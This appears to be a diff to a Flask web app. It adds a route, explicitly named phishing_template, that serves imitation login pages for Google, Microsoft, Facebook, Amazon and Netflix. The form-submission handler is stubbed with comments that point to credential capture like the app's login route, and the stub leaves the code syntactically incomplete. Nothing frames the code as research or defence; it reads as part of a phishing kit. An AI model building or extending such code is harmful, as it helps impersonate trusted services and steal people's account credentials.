@@ -52,5 +52,24 @@ def logout():
     session.pop('logged_in', None)
     return redirect(url_for('admin_login'))
 
+@app.route('/template/<template_name>', methods=['GET', 'POST'])
+def phishing_template(template_name):
+    if request.method == 'POST':
+        # Handle form submission similar to login route
+        # ...
+    
+    templates = {
+        'google': 'login.html',
+        'microsoft': 'microsoft_login.html',
+        'facebook': 'facebook_login.html',
+        'amazon': 'amazon_login.html',
+        'netflix': 'netflix_login.html'
+    }
+    
+    if template_name in templates:
+        return render_template(templates[template_name])
+    else:
+        return redirect(url_for('login'))
+
 if __name__ == '__main__':
     app.run(debug=True)
